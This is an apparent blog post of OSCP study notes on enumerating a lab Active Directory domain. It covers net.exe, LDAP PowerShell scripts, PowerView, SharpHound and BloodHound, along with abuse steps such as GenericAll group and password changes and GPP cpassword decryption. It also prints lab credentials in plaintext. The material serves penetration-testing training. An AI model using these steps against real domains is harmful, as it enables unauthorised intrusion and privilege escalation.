---
title: Active Directory Introduction and Enumeration
date: 2024-04-013 09:29:00 -0600
categories: [OSCP]
tags: [oscp, pen200, offsec, certs]     # TAG names should always be lowercase
---
*The Active Directory Introduction and Enumeration tools and tactics reviewed here are presented specifically in preparation for the OSCP exam per course suggestions and are by no means replacements for the OSCP training course, nor comprehensive guides for this step in the Kill Chain.*

# Active Directory Introduction and Enumeration

Active Directory Domain Services is a service that allows system administrators to update and manage operating systems, applications, users, and data access on a large scale.

## Active Directory - Introduction

All ADs have a domain name, like "corp.com", for which "corp" is often the org's name. AD relies on the DNS service and a typical domain contrller (DC) will also host a DNS server that is authoritative for the domain.

The objects (users, groups, and computers) are often organized into Organizational Units (OUs), which are comparable to file system folders.

AD relies on many things, like how user login requests are sent to the DC which checks whether or not that user is allowed to log in to that domain. One or more DCs act as the hub and core of the domain.

Members of Domain Admin are the most privileged objects in the domain, and compromising this member gives complete control over the domain.

AD instances can host more than one domain in a domain tree or multiple domain trees in a domain forest. There are Domain Admins for each domain in the forest, and there is an Enterprise Admin that has full control over all domains in the forest and has Admin privs over all DCs.

We will leverage a variety of tools to manually enumerate AD, most of which rely on the Lightweight Directory Access Protocol (LDAP).

### Enumeration - Defining Our Goals

In this case, we are investigating corp.com under the assumed breach of stephanie, who has RDP perms on Win11. We will perform the enumeration from one client machine with the low privileged stephanie domain user.

Once we gain access to additional users or computers, we will have to repeat parts of enum. This is the "pivot", and each one may give opportunitiy to advance our attack. 

## Active Directory - Manual Enumeration

### Active Directory - Enumeration Using Legacy Windows Tools

```
192.168.154.*
```

RDP to stephanie's client.

```console
$ xfreerdp /u:stephanie /d:corp.com /v:192.168.154.75
Password: LegmanTeamBenzoin!!
```

On her desktop, use cmd.

```console
> net user /domain
The request will be processed at a domain controller for domain corp.com.


User accounts for \\DC1.corp.com

-------------------------------------------------------------------------------
Administrator            dave                     Guest
iis_service              jeff                     jeffadmin
jen                      krbtgt                   pete
stephanie

// check out jeffadmin

> net user jeffadmin /domain
The request will be processed at a domain controller for domain corp.com.

User name                    jeffadmin
Full Name
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            9/2/2022 4:26:48 PM
Password expires             Never
Password changeable          9/3/2022 4:26:48 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   1/8/2024 4:47:01 AM

Logon hours allowed          All

Local Group Memberships      *Administrators
Global Group memberships     *Domain Users         *Domain Admins

// jeff is a domain admin! take note of this and remember it for later.

> net group /domain
Group Accounts for \\DC1.corp.com

-------------------------------------------------------------------------------
*Cloneable Domain Controllers
*Debug
*Development Department *****
*DnsUpdateProxy
*Domain Admins
*Domain Computers
*Domain Controllers
*Domain Guests
*Domain Users
*Enterprise Admins
*Enterprise Key Admins
*Enterprise Read-only Domain Controllers
*Group Policy Creator Owners
*Key Admins
*Management Department *****
*Protected Users
*Read-only Domain Controllers
*Sales Department *****
*Schema Admins

// the non-default domains listed here are Development Department, Management Department, and Sales Department.

> net group "Sales Department" /domain
Group name     Sales Department
Comment

Members

-------------------------------------------------------------------------------
pete                     stephanie
```

### Enumerating Active Directory using PowerShell and .NET Classes

PowerShell cmdlets like Get-ADUser1 work well but they are only installed by default on domain controllers as part of the Remote Server Administration Tools (RSAT), which is rarely present on clients and we would need admin privs to install.

We could, in principle, import the DLL required for enum, but we won't cover that here.

When a domain machine searches for an object, like a printer, or when we query user or group objects, LDAP is used as the communication channel for the query.

We need a specific LDAP ADsPath in order to communicate with the AD service.

```
LDAP://HostName[:PortNumber][/DistinguishedName]
```

Host name can be a computer name, IP, or domain naim. Note that if there are multiple DCs, setting the domain name could resolve to any of the DCs IP addresses. We should use the IP of the DC with the most updated info, called the Primary Domain Controller (PDC).  The port number is optional. It will automatically choose the port based on whether or not we are using an SSL connection. However, it is worth noting that if we come across a domain in the future using non-default ports, we may need to manually add this to the script.

Let's write the script, .\enumeration.ps1.

```
# Store the domain object in the $domainObj variable
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()

# Store the PdcRoleOwner name to the $PDC variable
$PDC = $domainObj.PdcRoleOwner.Name

# Store the Distinguished Name variable into the $DN variable
$DN = ([adsi]'').distinguishedName

$LDAP = "LDAP://$PDC/$DN"
$LDAP
```

```console
PS> powershell -ep bypass

PS>  .\enumeration.ps1
LDAP://DC1.corp.com/DC=corp,DC=com
```

Now, we have the full LDAP path required for enum.

### Adding Search Functionality to our Script

```
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$PDC = $domainObj.PdcRoleOwner.Name
$DN = ([adsi]'').distinguishedName
$LDAP = "LDAP://$PDC/$DN"

$direntry = New-Object System.DirectoryServices.DirectoryEntry($LDAP)

$dirsearcher = New-Object System.DirectoryServices.DirectorySearcher($direntry)
$dirsearcher.FindAll()
```

One thing to note with DirectoryEntry is that we can pass it credentials to authenticate to the domain. However, since we are already logged in, there is no need to do that here.

Running the above script will produce a lot of output. We can filer using samAccountType and other methods.

The official documentation reveals different values of the samAccountType attribute, but we'll start with 0x30000000 (decimal 805306368), which will enumerate all users in the domain.

We will also add an interation through each object to print each property on its own line.

```
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$PDC = $domainObj.PdcRoleOwner.Name
$DN = ([adsi]'').distinguishedName
$LDAP = "LDAP://$PDC/$DN"

$direntry = New-Object System.DirectoryServices.DirectoryEntry($LDAP)

$dirsearcher = New-Object System.DirectoryServices.DirectorySearcher($direntry)
$dirsearcher.filter="samAccountType=805306368"
$result = $dirsearcher.FindAll()

Foreach($obj in $result)
{
    Foreach($prop in $obj.Properties)
    {
        $prop
    }

    Write-Host "-------------------------------"
}
```

This complete script will search through AD and filter the results based on the samAccountType of our choosing.

We can filter based on any property of any object type. For example, we can change the script to filter for name=jeffadmin and added .memberof to the $prop variable to only display the groups jeffadmin is a member of.

```
$dirsearcher = New-Object System.DirectoryServices.DirectorySearcher($direntry)
$dirsearcher.filter="name=jeffadmin"
$result = $dirsearcher.FindAll()

Foreach($obj in $result)
{
    Foreach($prop in $obj.Properties)
    {
        $prop.memberof
    }

    Write-Host "-------------------------------"
}
```

We can make the script more flexible, allowing us to add the required parameters via the command line. For example, we could have the script accept the samAccountType we wish to enumerate as a command line argument.

```
function LDAPSearch {
    param (
        [string]$LDAPQuery
    )

    $PDC = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name
    $DistinguishedName = ([adsi]'').distinguishedName

    $DirectoryEntry = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$PDC/$DistinguishedName")

    $DirectorySearcher = New-Object System.DirectoryServices.DirectorySearcher($DirectoryEntry, $LDAPQuery)

    return $DirectorySearcher.FindAll()

}
```

To use this, you will need to do the following:

```console
PS> Import-Module .\function.ps1
PS> LDAPSearch -LDAPQuery "(samAccountType=805306368)"
```

We can also search directly for an Object Class, which is a component of AD that defines the object type. Let's use objectClass=group in this case to list all the groups in the domain:

```console
PS> LDAPSearch -LDAPQuery "(objectclass=group)"
LDAP://DC1.corp.com/CN=Read-only Domain Controllers,CN=Users,DC=corp,DC=com            {usnchanged, distinguishedname, grouptype, whencreated...}
LDAP://DC1.corp.com/CN=Enterprise Read-only Domain Controllers,CN=Users,DC=corp,DC=com {iscriticalsystemobject, usnchanged, distinguishedname, grouptype...}
...
```

This script enumerates more tha net.exe! This is because it enumerates all AD objects including Domain Local groups (not just global groups).

We can also call this in the cmd line such that we can print properties and attributes for objects.

```console
PS> foreach ($group in $(LDAPSearch -LDAPQuery "(objectCategory=group)")){ $group.properties | select {$_.cn}, {$_.member} }
```

Earlier when we enumerated the Sales Department group with net.exe, we only found two users in it: pete and stephanie. In this case however, it appears that Development Department is also a member.

For easier to read output, pipe the output into a variable and print the attribute of the variable.

```console
PS> $sales = LDAPSearch -LDAPQuery "(&(objectCategory=group)(cn=Sales Department))"
PS> $sales.properties.member
```

This group within a group is known as a nested group, which are common. net.exe missed this because it only lists user objects, not group objects. net.exe also cannot display specific attributes. 

Let's enum the Development Department more.

```console
PS> $group = LDAPSearch -LDAPQuery "(&(objectCategory=group)(cn=Development Department*))"

PS> $group.properties.member
CN=Management Department,DC=corp,DC=com
CN=pete,CN=Users,DC=corp,DC=com
CN=dave,CN=Users,DC=corp,DC=com
```

Another nested group - Management Department is a member of Development Department. 

```console
PS> $group = LDAPSearch -LDAPQuery "(&(objectCategory=group)(cn=Management Department*))"
PS> $group.properties.member
CN=jen,CN=Users,DC=corp,DC=com
```

We found the end! Note that jen is a member of Management Department, but also an indirect member of Sales Department and Development Department. This is normal for AD, but, if misconfigured, users might end up with more privileges than they should.

## AD Enumeration with PowerView

PowerView is a popular PS script for enum.

```console
PS> Import-Module .\PowerView.ps1

PS> Get-NetDomain
Forest                  : corp.com
DomainControllers       : {DC1.corp.com}
Children                : {}
DomainMode              : Unknown
DomainModeLevel         : 7
Parent                  :
PdcRoleOwner            : DC1.corp.com
RidRoleOwner            : DC1.corp.com
InfrastructureRoleOwner : DC1.corp.com
Name                    : corp.com

PS> Get-NetUser

// too much output

PS> Get-NetUser | select cn
Administrator
Guest
krbtgt
dave
stephanie
jeff
jeffadmin
iis_service
pete
jen
nathalie
fred
bob
robert
dennis
michelle
```

NOTE that passwords set a long time ago may be weaker than the current policy, making them easier to crack.

```console
PS> Get-NetUser | select cn,pwdlastset,lastlogon
cn            pwdlastset            lastlogon
--            ----------            ---------
Administrator 8/16/2022 5:27:22 PM  4/13/2024 9:19:47 AM
Guest         12/31/1600 4:00:00 PM 12/31/1600 4:00:00 PM
krbtgt        9/2/2022 4:10:48 PM   12/31/1600 4:00:00 PM
dave          9/7/2022 9:54:57 AM   4/13/2024 9:22:05 AM
stephanie     9/2/2022 4:23:38 PM   4/13/2024 9:18:20 AM
jeff          9/2/2022 4:27:20 PM   12/18/2023 11:55:16 PM
jeffadmin     9/2/2022 4:26:48 PM   1/8/2024 3:47:01 AM
iis_service   9/7/2022 5:38:43 AM   3/1/2023 3:40:02 AM
pete          9/6/2022 12:41:54 PM  2/1/2023 2:42:42 AM
jen           9/6/2022 12:43:01 PM  1/8/2024 1:26:03 AM
nathalie      4/13/2024 9:17:51 AM  12/31/1600 4:00:00 PM
fred          4/13/2024 9:17:52 AM  12/31/1600 4:00:00 PM
bob           4/13/2024 9:17:52 AM  12/31/1600 4:00:00 PM
robert        4/13/2024 9:17:52 AM  12/31/1600 4:00:00 PM
dennis        4/13/2024 9:17:52 AM  12/31/1600 4:00:00 PM
michelle      4/13/2024 9:17:52 AM  12/31/1600 4:00:00 PM

PS> Get-NetGroup | select cn
...
Key Admins
Enterprise Key Admins
DnsAdmins
DnsUpdateProxy
Sales Department
Management Department
Development Department
Debug

PS> Get-NetGroup "Sales Department" | select member
member
------
{CN=Development Department,DC=corp,DC=com, CN=pete,CN=Users,DC=corp,DC=com, CN=stephanie,CN=Users,DC=corp,DC=com}
```

## Manual Enumeration - Expanding our Repertoire

### Enumerating Operating Systems

```console
PS> Get-NetComputer
// lots of output

// many attribures are interesting, use select to get them

PS> Get-NetComputer | select operatingsystem,dnshostname
operatingsystem              dnshostname
---------------              -----------
Windows Server 2022 Standard DC1.corp.com
Windows Server 2022 Standard web04.corp.com
Windows Server 2022 Standard FILES04.corp.com
Windows 11 Pro               client74.corp.com
Windows 11 Pro               client75.corp.com
Windows 10 Pro               CLIENT76.corp.com
```

### Getting an Overview - Permissions and Logged on Users

When a user logs in to the domain, their credentials are cached in memory on the computer they logged in from. If we can steal those creds, we may be able to use them to authenticate as the domain user and potentially escalate domain privileges.

During an AD assessment, though, we may not always want to escalate our privileges right away. We should try to maintain our access, and if we can compromise other users that have the same perms as the user we currently have access to, this allows us to maintain our foothold. 

In order to find possible attack paths, we'll need to learn more about our initial user and see what else we have access to in the domain. We also need to find out where other users are logged in. 

PowerView's Find-LocalAdminAccess command scans the network in an attempt to determine if our current user has administrative permissions on any computers in the domain.

```console
PS> Find-LocalAdminAccess
client74.corp.com
```

Stephanie has Local admin on Client 74. Pause! Do not immediately log in to CLIENT74 to check perms. Zoom out.

Find currently logged in users.

```console
PS> Get-NetSession -ComputerName files04 -Verbose
VERBOSE: [Get-NetSession] Error: Access is denied

PS> Get-NetSession -ComputerName web04 -Verbose
VERBOSE: [Get-NetSession] Error: Access is denied
```

Priv issues... Run it as stephanie against the machine she has local admin on.

```console
PS> Get-NetSession -ComputerName client74 -Verbose
CName        : \\192.168.154.75
UserName     : stephanie
Time         : 0
IdleTime     : 0
ComputerName : client74
```

The permissions required to enumerate sessions with NetSessionEnum are defined in the SrvsvcSessionInfo registry key, which is located in the HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\LanmanServer\DefaultSecurity hive.

```console
PS> Get-Acl -Path HKLM:SYSTEM\CurrentControlSet\Services\LanmanServer\DefaultSecurity\ | fl

Path   : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\LanmanServer\Defaul
         tSecurity\
Owner  : NT AUTHORITY\SYSTEM
Group  : NT AUTHORITY\SYSTEM
Access : BUILTIN\Users Allow  ReadKey
         BUILTIN\Administrators Allow  FullControl
         NT AUTHORITY\SYSTEM Allow  FullControl
         CREATOR OWNER Allow  FullControl
         APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES Allow  ReadKey
         S-1-15-3-1024-1065365936-1281604716-3511738428-1654721687-432734479-3232135806-4053264122-3456934681 Allow
         ReadKey
Audit  :
Sddl   : O:SYG:SYD:AI(A;CIID;KR;;;BU)(A;CIID;KA;;;BA)(A;CIID;KA;;;SY)(A;CIIOID;KA;;;CO)(A;CIID;KR;;;AC)(A;CIID;KR;;;S
         -1-15-3-1024-1065365936-1281604716-3511738428-1654721687-432734479-3232135806-4053264122-3456934681)
```

Let's look at the OS versions in use.

```console
PS> Get-NetComputer | select dnshostname,operatingsystem,operatingsystemversion
dnshostname       operatingsystem              operatingsystemversion
-----------       ---------------              ----------------------
DC1.corp.com      Windows Server 2022 Standard 10.0 (20348)
web04.corp.com    Windows Server 2022 Standard 10.0 (20348)
FILES04.corp.com  Windows Server 2022 Standard 10.0 (20348)
client74.corp.com Windows 11 Enterprise        10.0 (22000)
client75.corp.com Windows 11 Enterprise        10.0 (22000)
CLIENT76.corp.com Windows 10 Pro               10.0 (16299)
```

Because of this, we will not be able to use PowerView to build the domain map we had in mind on systems since Windows Server 2019 build 1809.

There are more tools we can use if we run into this.

```console
PS> .\PsLoggedon.exe \\files04
PsLoggedon v1.35 - See who's logged on
Copyright (C) 2000-2016 Mark Russinovich
Sysinternals - www.sysinternals.com

Users logged on locally:
     <unknown time>             CORP\jeff
Unable to query resource logons

PS> .\PsLoggedon.exe \\web04

PsLoggedon v1.35 - See who's logged on
Copyright (C) 2000-2016 Mark Russinovich
Sysinternals - www.sysinternals.com

No one is logged on locally.
Unable to query resource logons

PS> .\PsLoggedon.exe \\client74
PsLoggedon v1.35 - See who's logged on
Copyright (C) 2000-2016 Mark Russinovich
Sysinternals - www.sysinternals.com

Users logged on locally:
     <unknown time>             CORP\jeffadmin

Users logged on via resource shares:
     4/13/2024 3:14:54 PM       CORP\stephanie
```

If our enumeration is accurate and we in fact have administrative privileges on CLIENT74, we should be able to log in there and possibly steal jeffadmin's credentials!

### Enumeration Through Service Principal Names

Service Accounts may also be members of high-privileged groups. Applications must be executed in the context of an operating system user. If a user launches an application, that user account defines the context. However, services launched by the system itself run in the context of a Service Account.

Isolated applications can use a set of predefined service accounts, such as LocalSystem, LocalService, and NetworkService. For more complex applications, a domain user account may be used to provide the needed context while still maintaining access to resources inside the domain.

When applications like Exchange, MS SQL, or Internet Information Services (IIS) are integrated into AD, a unique service instance identifier known as Service Principal Name (SPN) associates a service to a specific service account in Active Directory.

Let's enumerate Service Principal Names (SPNs).

```console
PS> setspn -L iis_service
Registered ServicePrincipalNames for CN=iis_service,CN=Users,DC=corp,DC=com:
        HTTP/web04.corp.com
        HTTP/web04
        HTTP/web04.corp.com:80

PS> Get-NetUser -SPN | select samaccountname,serviceprincipalname
samaccountname serviceprincipalname
-------------- --------------------
krbtgt         kadmin/changepw
iis_service    {HTTP/web04.corp.com, HTTP/web04, HTTP/web04.corp.com:80}

PS> nslookup.exe web04.corp.com
Server:  UnKnown
Address:  192.168.154.70

Name:    web04.corp.com
Address:  192.168.154.72
```

We see that this hostname is resolving to an internal IP. Navigating to the IP results in a website with a login requirement.

In this case, we will note and remember that the IIS service has a linked SPN, which might run with more privielges than regular domain user accounts.

### Enumerating Object Permissions

These are the permission types used to configure Access Control Entries (ACEs) that we are interested in:

```
GenericAll: Full permissions on object
GenericWrite: Edit certain attributes on the object
WriteOwner: Change ownership of the object
WriteDACL: Edit ACE's applied to object
AllExtendedRights: Change password, reset password, etc.
ForceChangePassword: Password change for object
Self (Self-Membership): Add ourselves to for example a group
```

Let's enumerate ACEs.

```console
PS> Get-ObjectAcl -Identity stephanie
ObjectSID              : S-1-5-21-1987370270-658905905-1781884369-1104
ActiveDirectoryRights  : ReadProperty
SecurityIdentifier     : S-1-5-21-1987370270-658905905-1781884369-553

// there is a lot of output, but the above is what we are interested in

// let's look at the SIDs

PS> Convert-SidToName S-1-5-21-1987370270-658905905-1781884369-1104
CORP\stephanie

PS> Convert-SidToName S-1-5-21-1987370270-658905905-1781884369-553
CORP\RAS and IAS Servers
```

Taking this information together, the RAS and IAS Servers group has ReadProperty access rights to our user. While this is a common configuration in AD and likely won't give us an attack vector, we have used the example to make sense of the information we have obtained.

In short, we are interested in the ActiveDirectoryRights and SecurityIdentifier for each object we enumerate going forward.

The highest access permission we can have on an object is GenericAll

```console
PS> Get-ObjectAcl -Identity "Management Department" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights

SecurityIdentifier                            ActiveDirectoryRights
------------------                            ---------------------
S-1-5-21-1987370270-658905905-1781884369-512             GenericAll
S-1-5-21-1987370270-658905905-1781884369-1104            GenericAll
S-1-5-32-548                                             GenericAll
S-1-5-18                                                 GenericAll
S-1-5-21-1987370270-658905905-1781884369-519             GenericAll

PS> "S-1-5-21-1987370270-658905905-1781884369-512","S-1-5-21-1987370270-658905905-1781884369-1104","S-1-5-32-548","S-1-5-18","S-1-5-21-1987370270-658905905-1781884369-519" | Convert-SidToName

CORP\Domain Admins
CORP\stephanie
BUILTIN\Account Operators
Local System
CORP\Enterprise Admins
```

It is not common for Users like stephanie to have the GenericAll permission. This may be a misconfiguration we can exploit.

As an experiment to show the power of misconfigured object permissions, let's try to use our permissions as stephanie to add ourselves to this group with net.exe.

```console
PS> net group "Management Department" stephanie /add /domain
The request will be processed at a domain controller for domain corp.com.

The command completed successfully.

PS> Get-NetGroup "Management Department" | select member
member
------
{CN=jen,CN=Users,DC=corp,DC=com, CN=stephanie,CN=Users,DC=corp,DC=com}

// cleanup

PS> net group "Management Department" stephanie /del /domain

PS> Get-NetGroup "Management Department" | select member
member
------
CN=jen,CN=Users,DC=corp,DC=com
```

### Enumerating Domain Shares

```console
PS> Find-DomainShare
Name           Type Remark                 ComputerName
----           ---- ------                 ------------
ADMIN$   2147483648 Remote Admin           DC1.corp.com
C$       2147483648 Default share          DC1.corp.com
IPC$     2147483651 Remote IPC             DC1.corp.com
NETLOGON          0 Logon server share     DC1.corp.com
SYSVOL            0 Logon server share     DC1.corp.com
ADMIN$   2147483648 Remote Admin           web04.corp.com
backup            0                        web04.corp.com
C$       2147483648 Default share          web04.corp.com
IPC$     2147483651 Remote IPC             web04.corp.com
ADMIN$   2147483648 Remote Admin           FILES04.corp.com
C                 0                        FILES04.corp.com
C$       2147483648 Default share          FILES04.corp.com
docshare          0 Documentation purposes FILES04.corp.com
IPC$     2147483651 Remote IPC             FILES04.corp.com
Tools             0                        FILES04.corp.com
Users             0                        FILES04.corp.com
Windows           0                        FILES04.corp.com
ADMIN$   2147483648 Remote Admin           client74.corp.com
C$       2147483648 Default share          client74.corp.com
IPC$     2147483651 Remote IPC             client74.corp.com
ADMIN$   2147483648 Remote Admin           client75.corp.com
C$       2147483648 Default share          client75.corp.com
IPC$     2147483651 Remote IPC             client75.corp.com
sharing           0                        client75.corp.com

PS> ls \\dc1.corp.com\sysvol\corp.com\
Directory: \\dc1.corp.com\sysvol\corp.com

net 
Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         9/21/2022   1:11 AM                Policies
d-----          9/2/2022   4:08 PM                scripts

PS> ls \\dc1.corp.com\sysvol\corp.com\Policies\
 Directory: \\dc1.corp.com\sysvol\corp.com\Policies


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         9/21/2022   1:13 AM                oldpolicy
d-----          9/2/2022   4:08 PM                {31B2F340-016D-11D2-945F-00C04FB984F9}
d-----          9/2/2022   4:08 PM                {6AC1786C-016F-11D2-945F-00C04fB984F9}

PS> cat \\dc1.corp.com\sysvol\corp.com\Policies\oldpolicy\old-policy-backup.xml
<?xml version="1.0" encoding="utf-8"?>
<Groups   clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}">
  <User   clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}"
          name="Administrator (built-in)"
          image="2"
          changed="2012-05-03 11:45:20"
          uid="{253F4D90-150A-4EFB-BCC8-6E894A9105F7}">
    <Properties
          action="U"
          newName=""
          fullName="admin"
          description="Change local admin"
          cpassword="+bsY0V3d4/KgX3VJdO/vyepPfAN1zMFTiQDApgR92JE"
          changeLogon="0"
          noChange="0"
          neverExpires="0"
          acctDisabled="0"
          userName="Administrator (built-in)"
          expires="2016-02-10" />
  </User>
</Groups>
```

We found a password! Historically, system administrators often changed local workstation passwords through Group Policy Preferences (GPP). However, even though GPP-stored passwords are encrypted with AES-256, the private key for the encryption has been posted on MSDN. can use this key to decrypt these encrypted passwords.

```console
kali$ gpp-decrypt "+bsY0V3d4/KgX3VJdO/vyepPfAN1zMFTiQDApgR92JE"
P@$$w0rd
```

Note this password down. Let's look at other shares of interest.

```console
PS> ls \\FILES04\docshare
 Directory: \\FILES04\docshare


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         9/21/2022   2:02 AM                docs

PS> ls \\FILES04\docshare\docs\do-not-share
 Directory: \\FILES04\docshare\docs\do-not-share


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         9/21/2022   2:02 AM           1142 start-email.txt

PS> cat \\FILES04\docshare\docs\do-not-share\start-email.txt
Hi Jeff,

We are excited to have you on the team here in Corp. As Pete mentioned, we have been without a system administrator
since Dennis left, and we are very happy to have you on board.

Pete mentioned that you had some issues logging in to your Corp account, so I'm sending this email to you on your personal address.

The username I'm sure you already know, but here you have the brand new auto generated password as well: HenchmanPutridBonbon11

As you may be aware, we are taking security more seriously now after the previous breach, so please change the password at first login.

Best Regards
Stephanie

__________________________________
Hey Stephanie,

Thank you for the warm welcome. I heard about the previous breach and that Dennis left the company.

Fortunately he gave me a great deal of documentation to go through, although in paper format. I'm in the
process of digitalizing the documentation so we can all share the knowledge. For now, you can find it in
the shared folder on the file server.

Thank you for reminding me to change the password, I will do so at the earliest convenience.

Best regards
Jeff
```

## Active Directory - Automated Enumeration

### Collecting Data with SharpHound

SharpHound uses Windows API functions and LDAP namespace functions similar to the ones we used manually. We should combine automatic and manual enum for AD assessments.

SharpHound is available in a few different formats. We can compile it ourselves, use an already compiled executable, or use it as a PowerShell script.

```console
PS> Import-Module .\Sharphound.ps1

// look at man

PS> Get-Help Invoke-BloodHound

// this might take a second

PS> Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Users\stephanie\Desktop\ -OutputPrefix "corp audit"
2024-04-14T08:25:17.0557117-07:00|INFORMATION|Status: 106 objects finished
INFORMATION|SharpHound Enumeration Completed at 8:25 AM on 4/14/2024! Happy Graphing!

PS> ls C:\Users\stephanie\Desktop\
Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         4/14/2024   8:25 AM          12579 corp audit_20240414082516_BloodHound.zip
-a----         4/14/2024   8:25 AM           9474 MTk2MmZkNjItY2IyNC00MWMzLTk5YzMtM2E1ZDcwYThkMzRl.bin
```

You can safely deleted the bin file - we won't need it.

### Analysing Data using BloodHound

We will analyze the domain data using BloodHound in Kali Linux, but it should be noted that we could install the application and required dependencies on Windows-based systems as well.

```console
$ sudo neo4j start
```

Navigate in a browser to http://localhost:7474/.

```console
$ bloodhound
```

Upload the zip file to BloodHound. Once the upload is complete, click More Info in the top left to see the Database Info. Click the Analysis button, and look for Find all Domain Admins. You will see a graph of the admins.

You can use the Analysis > Shortest Paths to see the shortest path to reaching our goal. For example, use "Find Shortest Paths to Domain Admins".

In the ? Help menu BloodHound also offers information in the Abuse tab, which will tell us more about the possible attack we can take on the given path. It also contains Opsec information as what to look out for when it comes to being detected, as well as references to the information displayed.

After further reading of Figure {@fig:ad_enum_bh_DA_short}, and after further inspection of the graph, we discover the connection jeffadmin has to CLIENT74. This means that the credentials for jeffadmin may be cached on the machine, which could be fatal for the organization. If we are able to take advantage of the given attack path and steal the credentials for jeffadmin, we should be able to log in as him and become domain admin.

As another example, try "Shortest Paths to Domain Admins from Owned Principals". In our example, we don't get any data returned. Owned Principals refers to the objects we are currently in control of in the domain. We can mark any object we'd like as owned in BloodHound, even if we haven't obtained access to them. In order for us to obtain an owned principal in BloodHound, we will run a search (top left), right click the object that shows in the middle of the screen, and click Mark User as Owned.

It's a good idea to mark every object we have access to as owned to improve our visibility into more potential attack vectors. There may be a short path to our goals that hinges on ownership of a particular object.

Additional example:

Have GenericAll? Change the user's password!

```console
PS> PS C:\Tools\PSTools> Set-DomainUserPassword -Identity robert

cmdlet Set-DomainUserPassword at command pipeline position 1
Supply values for the following parameters:
AccountPassword: ***************
PS C:\Tools\PSTools>
```

Now, runas them to find where they may be a local admin.

```console
PS> runas /user:robert@corp cmd.exe

PS> Find-LocalAdminAccess
```

Log into that system as them.